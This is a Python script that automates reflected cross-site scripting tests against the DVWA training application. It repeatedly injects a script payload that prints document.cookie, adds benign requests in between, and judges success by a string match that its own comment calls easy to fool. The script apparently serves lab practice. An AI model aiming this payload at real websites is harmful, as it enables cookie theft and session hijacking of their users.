import random
import string
import argparse
import urllib.parse
import requests
import time

def parse_args():
    parser = argparse.ArgumentParser(description="Automate XSS Tests on DVWA")
    parser.add_argument('base_url', type=str, help="Base URL of the DVWA application (e.g., http://localhost)")
    return parser.parse_args()

def generate_random_string(length=64):
    """Generates a random string of uppercase letters and digits."""
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def generate_payload():
    """Generates a dynamic XSS payload with a random string."""
    random_string = generate_random_string()
    payload = f"<script>console.log('{random_string}');console.log(document.cookie);</script>"
    return urllib.parse.quote(payload, safe='')

def initialize_session(base_url):
    """Initializes a session and extracts PHPSESSID & security cookies."""
    session = requests.Session()
    url = f"{base_url}/dv/vulnerabilities/xss_r/"
    session.get(url)
    php_sessid = session.cookies.get("PHPSESSID", "unknown_session")
    security_level = session.cookies.get("security", "low")
    session.close()
    print(f"Initialized session with PHPSESSID={php_sessid} and security={security_level}")
    return php_sessid, security_level

def send_benign_request(session, base_url):
    """Sends a benign GET request using an existing session without a Referer header."""
    url = f"{base_url}/dv/vulnerabilities/xss_r/"
    headers = {key: value for key, value in session.headers.items() if key != "Referer"}
    response = session.get(url, headers=headers)
    return response

def send_xss_request(session, payload, base_url):
    """Sends a single XSS payload using an existing session with a static referer header."""
    url = f"{base_url}/dv/vulnerabilities/xss_r/?name={payload}"
    headers = session.headers.copy()
    headers["Referer"] = f"{base_url}/dv/vulnerabilities/xss_r/"
    response = session.get(url, headers=headers)
    return response

def test_xss(base_url):
    """Runs XSS payloads in sequence using a persistent session."""
    php_sessid, security_level = initialize_session(base_url)
    session = requests.Session()
    session.cookies.set("PHPSESSID", php_sessid)
    session.cookies.set("security", security_level)
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Cookie": f"security={security_level}; security={security_level}; PHPSESSID={php_sessid}"
    })
    for i in range(5):
        if i > 0:
            benign_response = send_benign_request(session, base_url)
            if benign_response:
                print(f"Benign GET request performed successfully. Status code: {benign_response.status_code}")
            time.sleep(0.25)
        payload = generate_payload()
        response = send_xss_request(session, payload, base_url)
        # very easy to cheat, but didn't know of any other condition
        # at least it pertains to the current series of attacks
        if "console.log" in response.text:
            print(f"Success! XSS payload detected. Payload: {payload}")
        else:
            print(f"Failure. No XSS detected. Payload: {payload}")
        time.sleep(1)

def main():
    args = parse_args()
    base_url = args.base_url
    test_xss(base_url)

if __name__ == "__main__":
    main()